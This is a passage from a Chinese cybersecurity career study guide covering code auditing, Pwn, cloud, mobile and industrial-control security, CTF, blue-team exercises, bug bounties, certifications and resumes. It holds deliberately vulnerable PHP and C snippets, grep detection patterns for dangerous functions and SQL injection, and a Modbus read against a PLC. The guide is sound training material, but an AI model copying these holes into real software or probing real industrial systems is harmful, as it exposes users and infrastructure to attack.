- 答：2.0 覆盖更广（云/物联网/工控等新场景）、从"技术+管理"扩展到"三同步"，更强调持续合规
- 问：等保整改你作为运维/安全工程师做什么？
- 答：加固（口令/补丁/最小服务）、日志留存与集中、备份恢复、访问控制、配合测评机构整改项落地

## 第五阶段：专项进阶（选 1-2 个方向深挖）

### 方向一：代码审计（白盒挖洞，适合有编程底子）

**① 一句话本质**
代码审计 = 不看黑盒测试的"现象"，直接读源代码找漏洞——比黑盒渗透更彻底，能找到黑盒测不出来的逻辑漏洞，是"挖洞工程师"的核心能力。

**② 生活类比**
黑盒渗透像隔着墙猜屋里有什么（黑盒），代码审计像直接拿到房屋设计图纸（白盒）——图纸上哪里是承重墙、哪里有暗门、哪里少了一根支撑，一眼看穿。

**③ 原理详解**
- 审计什么漏洞（按危险程度排序）
  - RCE 类：命令注入、代码执行、反序列化
  - 注入类：SQL 注入、模板注入（SSTI）
  - 越权类：水平/垂直越权、任意文件读取/删除
  - 其他：文件上传、SSRF、逻辑漏洞（支付/优惠券）
- 审计路线（从入口找危险函数）
  - 找"危险函数"（sink）：system、exec、eval、include、unserialize、file_get_contents、SQL 拼接
  - 向上回溯"数据从哪来"（source）：用户输入（$_GET/$_POST/请求头/文件上传）
  - 判断是否可控：输入 → 过滤 → 危险函数，中间能绕过就是洞
- 两种方式
  - 人工审计：重点看登录/上传/下载/搜索等功能点
  - 工具辅助：Fortify、SonarQube（商业）、Semgrep（开源）、Seay（PHP 审计）、CodeQL（GitHub）
  - 工具能扫出"潜在风险点"，人工确认"是否可利用"
- 典型例子（一句话）
  - `include($_GET['page'])` → 任意文件包含/读取
  - `eval("return " . $input)` → 代码执行
  - SQL 字符串拼接 → 注入

**④ 命令/代码示例**
审计第一步：全局搜危险函数（PHP 项目举例）：
```bash
# 搜常见危险函数，逐个看上下文
grep -rn "eval(\|system(\|exec(\|shell_exec(\|unserialize(\|include(" 项目目录 --include="*.php"

# 搜 SQL 拼接（字符串拼的往往是注入点）
grep -rn "SELECT.*\$_" 项目目录 --include="*.php"
```

危险代码演示（识别的训练）：
```php
// 危险：include 用户可控 → 任意文件读取
include($_GET['page'] . ".php");

// 危险：SQL 拼接 → 注入
$sql = "SELECT * FROM users WHERE id=" . $_GET['id'];

// 安全：参数化查询
$stmt = $pdo->prepare("SELECT * FROM users WHERE id=?");
$stmt->execute([$_GET['id']]);
```

**⑤ 实战任务**
- 用开源审计工具（Semgrep/Seay）扫一个开源 PHP 项目（如老版 Discuz），看工具报出的风险点
- 重点审计一个功能：登录（SQL 注入/逻辑绕过）、文件上传（上传校验）、下载（路径穿越）
- 找 1 个"源码里的真实漏洞"写审计报告（CVE 靶场项目如 DVWA 源码可分析）

**⑥ 面试考点**
- 问：代码审计的流程？
- 答：先摸清功能/路由 → 找危险函数（sink）→ 回溯用户输入（source）→ 判断可控与过滤绕过 → 写 POC 验证
- 问：工具能代替人工审计吗？
- 答：不能，工具出"候选风险点"，人工确认可利用性；逻辑漏洞（越权、业务漏洞）工具基本扫不出来
- 问：审计优先看哪些功能？
- 答：上传、登录、下载、支付、导入导出、URL 参数直接参与的功能

### 方向二：二进制与逆向（Pwn，适合喜欢底层）

**① 一句话本质**
二进制安全 = 研究"机器代码"的安全——逆向是把程序"拆开看"（读懂别人写的代码），Pwn 是找程序在内存层面的漏洞（栈溢出等）并利用，CTF 的 Pwn/Reverse 方向就干这个。

**② 生活类比**
逆向 = 拿到一台没图纸的机器，拆开看齿轮怎么咬合（读懂逻辑）；Pwn = 发现这台机器的齿轮槽可以"塞入异物"让机器按你想法转（内存漏洞利用）。

**③ 原理详解**
- 逆向工程（Reverse）
  - 工具：IDA Pro（商业标杆）、Ghidra（免费 NSA 出品）、x64dbg（动态调试）、gdb
  - 流程：静态分析（读反汇编/伪代码）→ 动态调试（断点/单步看数据）→ 还原逻辑（加密算法、注册验证、恶意行为）
  - 场景：分析恶意样本、破解/分析 App、CTF Reverse 题
- Pwn（二进制漏洞利用）
  - 栈溢出：向栈缓冲区写超长数据，覆盖返回地址 → 劫持程序流程
  - 堆溢出：堆数据结构被破坏 → 任意读写
  - 格式化字符串：printf 用户输入 → 泄露内存/写任意地址
  - 利用链：找到漏洞 → 泄露地址（绕过 ASLR）→ 控制执行流 → getshell
  - 缓解机制（要懂）：NX（栈不可执行）、ASLR（地址随机化）、PIE、Canary（栈保护）、堆保护
- 学习路径建议
  - 先学汇编（x86/x64 基本指令）和 C 语言内存模型（栈/堆/指针）
  - 用 pwnable.kr / pwn.college / CTF 平台刷题
  - 工具：pwntools（Python 利用框架）

**④ 命令/代码示例**
gdb 调试入门（看栈）：
```bash
# 编译一个含漏洞的测试程序（教学用）
cat > vuln.c <<'EOF'
#include <stdio.h>
#include <string.h>
void vuln(char *s) { char buf[16]; strcpy(buf, s); }
int main(int argc, char **argv) { vuln(argv[1]); return 0; }
EOF
gcc -fno-stack-protector -o vuln vuln.c   # 关栈保护便于学习

# 反汇编看 main
objdump -d vuln | grep -A20 "<main>"

# gdb 调试
gdb ./vuln
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAA
```

**⑤ 实战任务**
- 完成上面的栈溢出例子：构造输入让程序崩溃（分段错误），再用 gdb 找到溢出偏移
- 在 pwnable.kr 或 CTF 平台刷 3-5 道入门题（Reverse 和 Pwn 各半）
- 用 Ghidra 分析一个恶意样本（在隔离沙箱/虚拟机），找到它的 C2 地址和功能

**⑥ 面试考点**
- 问：栈溢出漏洞的原理？
- 答：向栈缓冲区写入超过容量的数据，覆盖返回地址/局部变量，程序返回时跳转到攻击者控制的地址执行
- 问：什么是 ASLR？怎么绕过？
- 答：地址空间布局随机化（库/栈地址每次随机）；绕过靠"信息泄露"（先读地址再构造 payload）
- 问：逆向主要用什么工具？
- 答：静态用 IDA/Ghidra，动态用 x64dbg/gdb，配合 pwntools 写利用

### 方向三：云安全（你的云原生基础直接对口）

**① 一句话本质**
云安全 = 把"服务器的安全"搬到了云上并加了一层"云特有的风险"——对象存储越权、元数据泄露、容器逃逸、K8s 配置错误，你的 Docker/K8s 经验直接平移。

**② 生活类比**
以前你给自家院子装防盗门（单机安全），现在你住进了"安保物业"（云厂商），物业提供门禁（云防火墙）、前台（WAF）、监控（态势感知）——但共用设施也有新风险：你家储物柜（对象存储）可能被隔壁打开、电梯（容器）可能被人撬开爬进别人家。

**③ 原理详解**
- 云安全责任共担模型（必懂）
  - 云厂商管"云的安全"：物理机房、虚拟化层、网络
  - 你管"云里的安全"：系统配置、应用、数据、账号权限
  - 出事多为"你没管好"，不是厂商的锅
- 云平台安全产品（阿里云/腾讯云/华为云）
  - 云防火墙、云 WAF、云堡垒机（跳板机）
  - 态势感知（安全大屏+告警）、主机安全 Agent（云 HIDS）
  - KMS 密钥管理、云日志审计（SLS）
- 云特有风险（背熟）
  - 对象存储（OSS/S3）越权：Bucket 配置为"公共读"→ 数据泄露
  - 元数据服务：访问 169.254.169.254 拿临时凭据（配合 SSRF）
  - 云账号：AccessKey 泄露（GitHub 上搜索 AK 是常规操作）
  - 安全组配置错误：把 3306/6379 暴露公网
- 容器与 K8s 安全
  - 镜像安全：镜像扫描（Trivy/Clair）找已知漏洞、供应链投毒
  - 容器隔离：以 root 跑容器、privileged 特权容器 = 逃逸风险
  - K8s 安全：kubelet 未授权、API Server 暴露公网、RBAC 配置错误、Secret 明文存储
  - 容器逃逸：利用内核漏洞/错误挂载逃出容器控制宿主机
- 云渗透测试：云资产测绘（FOFA 找暴露的云服务）、Bucket 枚举、AK 利用

**④ 命令/代码示例**
容器安全基础检查（结合你的 Docker 经验）：
```bash
# 1. 检查运行中的容器是否特权/root（逃逸风险）
docker ps --format "{{.Names}} {{.Image}}" 
docker inspect $(docker ps -q) --format "{{.Name}}: privileged={{.HostConfig.Privileged}}"

# 2. 镜像漏洞扫描（Trivy）
trivy image nginx:latest

# 3. K8s 常见错误配置自查
kubectl get secrets            # Secret 是否明文
kubectl get clusterroles       # RBAC 是否过宽
```

**⑤ 实战任务**
- 用 Trivy 扫描自己环境里的镜像，记录漏洞数量并选 1 个升级修复
- 练习"对象存储越权检测"：读一个测试 Bucket 的策略配置（本地/测试环境），判断是否公共读
- 检查自己 K8s 集群（如有）的：API Server 是否公网暴露、有没有特权容器

**⑥ 面试考点**
- 问：云上最容易出的安全问题是什么？
- 答：AccessKey 泄露、对象存储公共读（数据泄露）、安全组把数据库端口暴露公网、容器/系统弱口令——多数是"配置错误"
- 问：什么是容器逃逸？
- 答：攻击者从容器内利用内核漏洞/特权配置逃出容器、控制宿主机；防护：非 root 运行、禁 privileged、镜像扫描、内核及时更新
- 问：云厂商和用户的责任怎么分？
- 答：责任共担——厂商管物理/虚拟化/网络（云的安全），用户管系统/应用/数据/权限（云里的安全）

### 方向四：移动安全（APP 逆向，适合喜欢 App）

**① 一句话本质**
移动安全 = 分析手机 App 里的漏洞——App 逆向看"加密算法和逻辑"（往往藏着密钥和接口），APP 渗透测"接口和逻辑"（越权、支付漏洞），是一线 App 厂商的高频需求。

**② 生活类比**
App 像一个"加密的保险柜"：加固/混淆是保险柜的铁皮（防拆），逆向就是想办法拆开铁皮看里面的结构；而接口安全是"柜子后面的管道"——直接测管道（服务端接口）往往比拆柜子更有效。

**③ 原理详解**
- APP 逆向（拆开看）
  - 工具：jadx（APK 反编译为 Java 代码）、Frida（动态 Hook，改运行逻辑）、Burp（抓包）
  - 步骤：解包（apktool）→ 反编译（jadx 看逻辑）→ 抓包（Burp 配证书）→ 动态调试（Frida Hook 关键函数）
  - 常见发现：硬编码的密钥/接口、加密算法、隐藏的后门
  - 加固对抗：混淆、加固壳（梆梆/爱加密）→ 用脱壳工具（FART）脱壳再分析
- APP 渗透测试（测接口）
  - 抓包改包：改请求参数（金额、数量、ID）测越权/支付漏洞
  - 接口安全：无鉴权接口、越权接口、弱加密传输
  - 常见漏洞：登录绕过、支付金额篡改、优惠券刷单、任意用户注册
- 移动端特有风险
  - 数据存储：明文存密码/Token 在本地（SharedPreferences/SQLite）
  - 组件暴露：Android 组件（Activity/Service）被外部调用
  - 键盘记录、点击劫持、WebView 漏洞

**④ 命令/代码示例**
APP 逆向基础流程（测试环境）：
```bash
# 1. 解包 APK
apktool d app.apk -o app_src

# 2. 反编译看 Java 代码（找密钥/接口/逻辑）
jadx -d app_java app.apk
grep -rn "password\|secret\|token\|api" app_java --include="*.java" | head

# 3. 证书配置后抓包（Burp 抓 HTTPS 需装 CA 证书）
# 4. Frida Hook 关键函数（动态看参数/返回值）
frida -U -f com.example.app -l hook.js
```

**⑤ 实战任务**
- 找一个开源测试 App（如 OWASP 的靶场 App：UnCrackable / InsecureBankv2），完成：解包→反编译→找硬编码密钥→抓包
- 用 Burp 改包测试一个靶场 App 的接口（改参数看越权）
- 了解加固与脱壳：找一篇脱壳教程读一遍，画出"加固→脱壳"的原理图

**⑥ 面试考点**
- 问：APP 逆向常用工具？
- 答：jadx（静态反编译）、Frida（动态 Hook）、apktool（解包）、Burp（抓包）；加固 App 需先脱壳
- 问：移动端常见漏洞？
- 答：本地明文存储、接口越权/无鉴权、支付逻辑漏洞、WebView 漏洞、组件暴露
- 问：APP 的密钥存在哪最安全？
- 答：不存在客户端（任何客户端都能被逆向），放服务端；客户端只放公开数据——"客户端不可信"是移动安全第一原则

### 方向五：工控安全（蓝海方向）

**① 一句话本质**
工控安全 = 保护工厂/电力的"工业控制系统"（PLC、SCADA）——这些系统直接影响物理世界（发电、供水、流水线），一旦被攻击可能造成物理损失，是近年来安全人才缺口大的蓝海。

**② 生活类比**
普通网络安全像"保护办公楼的 IT 系统"（数据丢了是损失）；工控安全像"保护电站和工厂的控制室"（系统被攻击可能导致停电、爆炸）——后果从"数据损失"升级到"物理安全"。

**③ 原理详解**
- 工控系统是什么
  - ICS/SCADA：工业控制系统/数据采集与监控系统
  - 核心设备：PLC（可编程逻辑控制器，控制机器）、RTU（远程终端单元）、HMI（人机界面）、上位机
  - 典型场景：电力、水务、石油、制造、交通
- 工控系统为什么"裸奔"
  - 设计初衷是"可用优先"，没有安全设计（很多协议明文：Modbus、S7comm）
  - 老设备不能打补丁（一打就停线）
  - 内网隔离不足，IT 网被攻破就能进 OT 网
- 工控安全典型风险
  - 协议攻击：Modbus 无认证，可伪造指令控制 PLC
  - 漏洞利用：历史事件（乌克兰电网断电、震网病毒 Stuxnet 攻击伊朗核设施）
  - 高危行为：U 盘摆渡（最常见的入侵入口）、违规外联
- 防护思路
  - 网络隔离：IT/OT 分区，工业防火墙
  - 白名单机制：工控环境"白名单优先"（只允许已知应用/协议）
  - 资产梳理与监测：工控资产台账、协议审计
  - 运维安全：U 盘管控、堡垒机、补丁测试流程（先验证再上）
- 认证与学习：CISP-ICSSE（工控安全方向）、ICS-CERT 资料、CVE 里搜 SCADA/PLC

**④ 命令/代码示例**
理解工控协议风险（Modbus 无认证）：
```bash
# 用 Python 读一个 Modbus 寄存器（无认证协议演示，仅教学理解）
# pip install pymodbus
# 注意：仅在你自己搭建的模拟环境/仿真器上测试，严禁触碰真实工控系统
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient("192.168.1.10", port=502)
c.connect()
rr = c.read_holding_registers(1, 5, slave=1)   # 读寄存器
print(rr.registers)
```

**⑤ 实战任务**
- 在虚拟机里搭一个 Modbus 仿真器（或找工控靶场如 ICS CTF），体验"协议无认证读取"
- 学习"震网病毒"（Stuxnet）的原理，用自己的话总结"攻击如何从 IT 网渗透到工控网"
- 读一篇工控安全事件报告（如乌克兰电网事件），画出攻击时间线

**⑥ 面试考点**
- 问：工控系统安全为什么难做？
- 答：老设备不能打补丁（停线成本高）、协议无认证、IT/OT 边界模糊、安全方案要"不影响生产"优先
- 问：工控安全的主要防护思路？
- 答：IT/OT 网络隔离 + 白名单 + 资产梳理与协议监测 + U 盘/外联管控 + 补丁验证流程
- 问：为什么会缺工控安全人才？
- 答：需要同时懂"工控协议/设备"和"网络安全"的复合背景，行业正在补课，缺口大、竞争小

## 第六阶段：实战与认证（把本事变成履历）

### 知识点 1：靶场平台（每天练手的地方）

**① 一句话本质**
靶场 = 专门"用来被打"的练习场地——安全合法地练攻击，不用怕进局子；渗透测试能力就是靠靶场一关一关刷出来的。

**② 生活类比**
练射击不能拿真人练，得去射击场打靶纸；靶场就是安全行业的"射击场"，靶纸是故意布置的漏洞，你怎么打都合法。

**③ 原理详解**
- 本地靶场（自己搭，练 Web 基础）
  - DVWA：经典 Web 靶场，内置 SQL 注入/XSS/CSRF/文件上传/命令注入等模块，难度可调
  - sqli-labs：专练 SQL 注入（89 关，从入门到盲注到堆叠注入）
  - pikachu：中文界面靶场，覆盖 Web 常见漏洞 + 越权 + SSRF，适合新手
  - upload-labs：专练文件上传绕过（十几关）
  - 搭建：Docker 一条命令 `docker run`，容器里跑，用完删
- 在线平台（练综合能力 + 排名）
  - TryHackMe：引导式学习，新手友好，有免费房间
  - HackTheBox（HTB）：进阶实战，虚拟机渗透，圈子认可度最高的实战平台
  - 攻防世界、BUUCTF：CTF 真题，中文友好
  - 伏特加（Vulnhub）：离线靶机镜像，导入 VMware/VirtualBox 就能打
- 练习节奏建议
  - 阶段一：本地靶场把每个漏洞"原理+手工+工具"各打一遍
  - 阶段二：在线平台按难度刷机，写渗透报告
  - 阶段三：参加 CTF/护网/众测实战，见真实世界

**④ 命令/代码示例**
用 Docker 一分钟拉起 DVWA：
```bash
docker run -d -p 8080:80 vulnerables/web-dvwa
# 浏览器访问 http://localhost:8080 ，默认账号 admin / password

# 拉 sqli-labs（SQL 注入专项）
docker run -d -p 8081:80 shawnxlee/sqli-labs

# 用完清场
docker ps --format "{{.ID}} {{.Names}}" | grep -i sqli
docker stop <容器ID> && docker rm <容器ID>
```

**⑤ 实战任务**
- 用 Docker 拉 DVWA，完成：SQL 注入、XSS、文件上传三个模块各一遍（手工）
- 刷完 sqli-labs 前 20 关（覆盖联合/布尔/时间/堆叠注入）
- 注册 TryHackMe，完成 3 个 Beginner 房间，写下每台机器的渗透思路笔记

**⑥ 面试考点**
- 问：怎么证明你有渗透能力？
- 答：晒平台排名/解题记录（HTB、CTF）、GitHub 渗透笔记、SRC 提交记录、护网经历——比口头说"会渗透"有说服力
- 问：DVWA 有哪些难度？各自区别？
- 答：Low（无防护）/Medium（简单过滤）/High（安全编码）/Impossible（正确写法），从 Low 打到 High 能体会"绕过"和"防御"两个视角

### 知识点 2：CTF 竞赛（以赛代练）

**① 一句话本质**
CTF = 网络安全"黑客奥运会"——解一系列精心设计的"谜题"拿 flag（一段字符串），考的是对漏洞、密码学、逆向、流量分析的掌握，是入行简历的硬通货。

**② 生活类比**
像密室逃脱：主办方（出题人）布下一个个"谜室"（题目），你在限定时间内找到每间密室的"通关钥匙"（flag），交到裁判处得分——比谁又快又多。

**③ 原理详解**
- CTF 题型（五大方向，背熟）
  - Web：找网站漏洞拿 flag（SQL 注入、XSS、反序列化、文件包含）
  - Pwn：二进制漏洞利用（栈溢出、堆利用）
  - Reverse：逆向分析（破解程序逻辑、加密算法）
  - Crypto：密码学（古典密码、RSA、AES 出题）
  - Misc：杂项（图片隐写、流量分析、编码）
  - （有的还有 Forensics 取证、MISC 流量）
- 常见比赛
  - 国内：强网杯、护网杯、XCTF、国赛（全国大学生信息安全竞赛）
  - 国际：CTF Time 上排名的全球赛
  - 新手练题：攻防世界（web 入门）、BUUCTF（题库全）
- 新手入坑建议
  - 选一个方向深钻（Web 最容易入门，你已有基础）
  - 刷题是唯一路径：每天 1-2 道，看 wp（writeup 题解）补知识
  - 组队打比赛：团队分工（一人 Web、一人 Reverse）
- 参加比赛你能得到什么
  - 简历加分（比赛名次/题解博客）
  - 逼自己系统学（出题范围广）
  - 认识圈子、了解真实攻防

**④ 命令/代码示例**
CTF 常用小技巧（Misc 入门三件套）：
```bash
# 1. 字符串提取（flag 常藏在二进制/图片里）
strings flag.png | grep -i "flag"

# 2. 图片隐写（文件尾追加的数据、LSB 隐写）
binwalk flag.png          # 看图片里有没有藏东西
# zsteg / steghide 也是常用隐写工具

# 3. 编码识别（Base64/URL/Hex 轮着试）
echo "ZmxhZ3t0ZXN0fQ==" | base64 -d
```

**⑤ 实战任务**
- 在攻防世界/BUUCTF 上做 10 道 Web 入门题（常见套路：弱口令、注入、文件包含、反序列化）
- 做 3 道 Misc 题（隐写、流量、编码），熟练 strings/binwalk/base64 三件套
- 关注 XCTF 或学校社团，参加一次线上赛（即使 0 解也要写复盘）

**⑥ 面试考点**
- 问：CTF 五大方向是什么？
- 答：Web、Pwn、Reverse、Crypto、Misc（有的含 Forensics）；Web 最容易入门，Pwn/Reverse 门槛最高
- 问：CTF 对你的价值？
- 答：系统逼学技术、简历硬通货、进圈子的门票；但面试更看重"实战项目"（SRC/护网），CTF 是辅助证明

### 知识点 3：护网行动（HVV，蓝队抢手）

**① 一句话本质**
护网 = 国家组织的"红蓝对抗演习"——红队（攻击队）去攻击真实目标系统，蓝队（防守队）防守并发现攻击，打一场为期 2 周的真实攻防，蓝队是网络安全从业者的重要收入来源。

**② 生活类比**
一年一度"防盗演练"：物业请一队"专业小偷"（红队）限时 2 周试着偷你家（目标系统），保安（蓝队）加班盯监控、补漏洞、抓小偷——被抓到的监控死角（失分点）就是明年要加固的地方。

**③ 原理详解**
- 护网怎么打（规则粗解）
  - 时间：每年 7-9 月，一般 1-2 周，分 A 组（红）B 组（蓝）
  - 红队：以拿到目标系统权限、数据为得分；手段包括钓鱼、0day、漏洞利用、社工
  - 蓝队：防守，防住攻击+发现攻击+溯源反制为得分
  - 禁则：禁止破坏业务、禁止攻击无关目标（红线）
- 蓝队怎么防（蓝队工作内容）
  - 前期：资产梳理、漏洞整改、加固、部署监测
  - 战中：7x24 值班，盯告警（WAF/SIEM/态势感知）、研判攻击、封 IP、溯源
  - 后期：写防守报告、复盘
- 对你的意义
  - 蓝队需求大、门槛相对低（会看日志+应急即可入门），是入行/兼职好入口
  - 日薪 1000-3000+（按经验），每年一次
  - 简历亮点：护网经历 = 真实攻防经验证明
- 需要的技能（对照前几阶段）
  - 日志分析（第四阶段知识点 2）
  - 应急响应（第四阶段知识点 3）
  - 安全设备使用（WAF/态势感知）
  - 会用 tcpdump/Wireshark 看攻击流量

**④ 命令/代码示例**
蓝队值班常用命令（快速定位攻击）：
```bash
# 1. 看异常连接（谁在连我、连去哪）
ss -antp | grep ESTAB
netstat -ant | wc -l          # 连接数异常暴涨 = 攻击

# 2. 封攻击 IP（应急第一动作）
iptables -A INPUT -s 1.2.3.4 -j DROP

# 3. 抓包取证（保存攻击流量）
tcpdump -i eth0 host 1.2.3.4 -w attack.pcap

# 4. 看 Web 攻击特征（日志里找注入/扫描）
grep -E "union|select|sqlmap|\.\./" /var/log/nginx/access.log | head
```

**⑤ 实战任务**
- 用 DVWA 制造一次"攻击"（SQL 注入），再从 Nginx 日志和抓包两个角度还原攻击过程（蓝队视角）
- 看 1-2 篇护网蓝队复盘文章，总结"蓝队失分常见原因"
- 整理一份"护网值班手册"（告警分级、应急动作清单、汇报模板）

**⑥ 面试考点**
- 问：护网蓝队怎么入门？
- 答：会看日志（Web/系统/设备）+ 会应急（webshell/挖矿/扫描处置）+ 会用安全设备；先以"研判员"角色参与，逐步升级
- 问：蓝队和红队哪个容易入门？
- 答：蓝队更容易（防守是"会看+会堵"），红队要懂攻击链全流程；蓝队缺口大，也是多数人的第一站

### 知识点 4：SRC 众测（挖洞赚钱）

**① 一句话本质**
SRC = 企业"悬赏找 bug"——企业公布自己的系统，邀请安全研究者挖漏洞，挖到按严重程度给奖金（几十到几十万），合法合规，还能把漏洞当简历。

**② 生活类比**
商场请人"假扮顾客挑毛病"：挑出台阶太高、灯光太暗等真问题，商场按问题的严重性给奖励——企业用"找茬奖"提高安全，你凭真本事赚钱和刷履历。

**③ 原理详解**
- 国内主流 SRC 平台（背几个）
  - 补天漏洞响应平台（量最大）
  - 漏洞盒子（企业多）
  - 各家自建 SRC：蚂蚁 SRC、腾讯安全应急响应中心（TSRC）、字节跳动 SRC、阿里 SRC
  - 众测平台：补天众测、漏洞盒子众测、火线安全
- 漏洞等级与奖金（参考）
  - 严重（RCE/脱库/核心系统接管）：数万到数十万
  - 高危（SQL 注入/越权访问数据）：数千到数万
  - 中危（XSS/信息泄露）：几百到几千
  - 低危（轻微信息泄露）：几十到几百
- 新手怎么开始
  - 先学规则：每家 SRC 有"测试范围、禁测系统（核心业务/数据库）、禁测手法（DDoS/钓鱼社会工程）"——超范围测试可能被判违规
  - 从小目标开始：选业务简单的企业，信息收集 → 测常见漏洞（越权/注入/文件上传）
  - 认真写报告：漏洞描述、复现步骤、POC、影响范围、修复建议（报告质量影响评级和口碑）
- 注意事项（红线）
  - 只在授权范围测（SRC 授权即可测，超出范围=违法）
  - 不下载/不修改真实数据（点到即止）
  - 不做 DDoS、不搞社工

**④ 命令/代码示例**
SRC 测试流程参考（合规版）：
```bash
# 1. 先读目标 SRC 的授权范围（哪域名能测）
# 2. 信息收集（授权范围内）
subfinder -d 目标域名 -all
nmap -sV 目标IP

# 3. 测常见漏洞（全部在授权范围，点到为止）
#    越权：改 user_id/order_id 参数（不下载数据，确认可越权即停）
#    注入：加 ' 看是否报错（确认存在即停，不脱库）
#    文件上传：传一个无害测试文件验证能否执行

# 4. 写报告：漏洞描述 / 复现步骤 / POC / 影响 / 修复建议
```

**⑤ 实战任务**
- 注册补天或一家企业 SRC，读它的"测试范围与规范"，明确哪些能做哪些不能
- 在授权范围内对 1 个目标完成一次"信息收集→测越权/XSS→写报告"全流程
- 学习 3 篇 SRC 大佬的漏洞报告（看评级为严重/高危的报告长什么样）

**⑥ 面试考点**
- 问：SRC 和黑产的界限？
- 答：SRC 是企业授权、限定范围、回报漏洞；黑产未授权攻击牟利违法。SRC 的核心红线：只在授权范围、点到即止、不碰数据
- 问：怎么提高 SRC 漏洞评级？
- 答：影响面大（核心资产/大量用户数据）、利用链完整（从入口到提权到数据）、报告专业清晰；测到高危漏洞优先报严重

### 知识点 5：认证体系（含金量梯队）

**① 一句话本质**
认证 = 行业认可的"能力证明"，分梯次：入门看 CISP 方向，进阶看 OSCP/OSWE 等实战认证，管理方向看 CISSP——证书不是万能，但简历筛选中常是"硬门槛"。

**② 生活类比**
学历和职称的区别：CISP 像"执业资格证"（从业必须有，国家认可）；OSCP 像"奥赛金牌"（证明实战强）；CISSP 像"高级职称"（资深从业者的背书）。

**③ 原理详解**
- 国内认证（入门/从业向）
  - CISP（注册信息安全专业人员）：国内认可度最高的基础认证，分 CISP（技术）、CISP-PTE（渗透）、CISP-DSG（数据安全）等
  - NISP（国家信息安全水平考试）：学生版 CISP，先考 NISP 后考 CISP
  - 软考信息安全工程师：职称类，国企/事业单位认可
- 国际认证（进阶/实力向）
  - OSCP（Offensive Security Certified Professional）：进攻型实战认证，必须真实渗透一台台靶机才能拿证，圈内公认含金量最高的入门实战证
  - OSWE：Web 方向进阶（代码审计）
  - CEH（道德黑客）：知名度高但理论为主，含金量一般
  - CISSP：管理方向（安全架构/风险管理），要求 5 年经验，适合转管理层
- 报考建议（按你的情况）
  - 路线：NISP → CISP-PTE（国内从业）→ OSCP（实战进阶，自学可考）
  - 顺序逻辑：先国内证书满足"从业门槛"，再 OSCP 证明"实战能力"
  - 别一上来考 CISSP（需要经验年限，考了也难续）
- 证书与能力的关系（重要认知）
  - 证书是"敲门砖"，能力是"留人符"——面试最后问的还是项目细节
  - 考 OSCP 的过程（大量真实打靶）本身就是最好的能力训练

**④ 命令/代码示例**
OSCP 备考核心练习方向（需要会的东西）：
```bash
# OSCP 必考能力（对照自查）
# 1. 信息收集与枚举：nmap 全套、目录扫描、子域枚举
# 2. Web 攻击：SQL 注入、文件上传、反序列化、SSRF
# 3. 提权：Linux（SUID/sudo/内核）、Windows（Potato/服务漏洞）
# 4. 缓冲区溢出（老版 OSCP 有 BoF 题）
# 5. 内网横向：凭据收集、PTH、代理

# 练习平台：HTB / TryHackMe / PG Practice（Offsec 官方练习场）
```

**⑤ 实战任务**
- 查 CISP-PTE 和 OSCP 的考试内容与报名条件，做个对比表（费用、周期、难度、含金量）
- 制定你的考证路线图：半年内考哪个、需要补哪些技能点
- 如果条件允许，报名 OSCP 学习课程（或先做 PG Practice 靶机热身）

**⑥ 面试考点**
- 问：OSCP 为什么含金量高？
- 答：它不考理论、必须真实渗透打靶（约 20 台机器拿 shell+提权），24 小时实操考试，没实战能力过不了
- 问：国内做安全需要 CISP 吗？
- 答：很多政企/乙方项目投标硬性要求 CISP 数量，从业合规角度值得考；但纯甲方技术岗更看实战（护网/SRC/项目）

## 第七阶段：求职与面试（临门一脚）

### 知识点 1：简历写作（把技能翻译成卖点）

**① 一句话本质**
安全简历 = 用"项目/实战结果"证明能力，而不是堆技术名词——HR 筛简历看关键词，技术面试官看"你干过什么、多深"，两关都要过。

**② 生活类比**
简历像产品说明书：光写"有摄像头、有屏幕"（会 nmap、懂 SQL 注入）没人买，要写"拍照能拍月亮、续航 2 天"（实战成果：XX 系统找到 3 个高危漏洞、护网拦截 XX 次攻击）。

**③ 原理详解**
- 安全简历的核心结构（5 块）
  - 个人信息 + 求职意向（写清楚方向：Web 安全/安全运维/渗透）
  - 技能清单（分层：熟练/了解，别全写"熟悉"）
  - 项目/实战经历（重点！用"结果"说话）
  - 认证与竞赛（CISP/OSCP、CTF 名次）
  - 其他（博客/GitHub 笔记/开源贡献）
- 怎么写"实战经历"（STAR 法则简化）
  - 背景：XX 企业 SRC / 护网蓝队 / 公司内部渗透
  - 行动：做了什么（信息收集→发现越权→修复推动）
  - 结果（数字）：发现 X 个高危漏洞、封堵 X 次攻击、缩短响应时间
  - 例："参与护网蓝队值守 7 天，监测日志识别 XSS 批量扫描攻击，联动 WAF 封禁攻击 IP 200+，零失分"
- 新手没经历怎么写
  - 写靶场/CTF 成果：HTB 到 xx 台机器、CTF 排名、渗透笔记博客链接
  - 写工具/脚本：自写的扫描脚本、漏扫脚本（GitHub 可验证）
  - 写学习输出：文档、笔记（你正在写的这份就是素材）
- 避坑（背熟）
  - 别写"精通"一堆工具（面试一深问就穿帮）
  - 别写敏感信息（客户名、漏洞详情），用"XX 企业"匿名
  - 别堆术语没有实例（"熟悉 OWASP Top 10"不如"修复过 XX 的 SQL 注入"）

**④ 命令/代码示例**
简历实战经历写法对比：
```text
✗ 差：熟悉渗透测试，会 SQL 注入、XSS、文件上传，了解 Metasploit。

✓ 好：在某 SRC 授权范围内完成 XX 业务系统渗透，
     发现 1 个高危越权漏洞（可查看他人订单）并提交修复方案，
     获高危评级奖励；独立完成 DVWA/sqli-labs 全模块、
     HTB 打靶 15 台并输出英文 writeup 至博客。
```

**⑤ 实战任务**
- 用上面的模板，把"学习文档+靶场经历+（如有）护网/SRC"写成一份一页简历
- 找 2 个安全岗 JD（招聘要求），逐条对照你的简历标注"匹配/缺项"，缺项列入下一步学习
- 写一份 3 分钟"自我介绍"（突出：会什么→干过什么→想做哪块）

**⑥ 面试考点**
- 问：简历里项目经历怎么写最加分？
- 答：用结果量化（发现 X 漏洞/拦截 X 攻击/平台排名），同时写清"自己负责的部分"（防止被追问穿帮）
- 问：没有安全工作经验怎么写简历？
- 答：用靶场/CTF/SRC/自研工具/学习笔记证明能力，安全岗看重"能动手"，展示动手证据即可入局

### 知识点 2：岗位选择（安全职业地图）

**① 一句话本质**
安全岗位分三大类：甲方（企业安全部，守自家）、乙方（安全厂商/服务商，帮别人）、红蓝/研究（渗透测试、应急、二进制等）——不同岗位工作内容、薪资、成长路线差异很大，先选对方向再努力。

**② 生活类比**
同样是医生：三甲医院的医生（甲方）治本院病人，私立诊所的医生（乙方）服务付费客户，科研院的医生（研究）搞疑难杂症和新技术——分工不同，都重要，看你喜欢哪种。

**③ 原理详解**
- 甲方（企业安全部）
